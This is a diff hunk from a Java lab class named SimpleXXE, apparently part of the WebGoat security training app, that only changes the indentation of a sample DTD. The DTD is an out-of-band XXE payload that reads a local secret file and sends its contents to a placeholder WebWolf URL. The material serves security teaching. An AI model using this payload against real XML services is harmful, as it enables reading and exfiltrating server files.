@@ -99,10 +99,10 @@ public class SimpleXXE implements AssignmentEndpoint {
   @ResponseBody
   public String getSampleDTDFile() {
     return """
-                <?xml version="1.0" encoding="UTF-8"?>
-                <!ENTITY % file SYSTEM "file:replace-this-by-webgoat-temp-directory/XXE/secret.txt">
-                <!ENTITY % all "<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>">
-                %all;
-                """;
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % file SYSTEM "file:replace-this-by-webgoat-temp-directory/XXE/secret.txt">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>">
+%all;
+""";
   }
 }
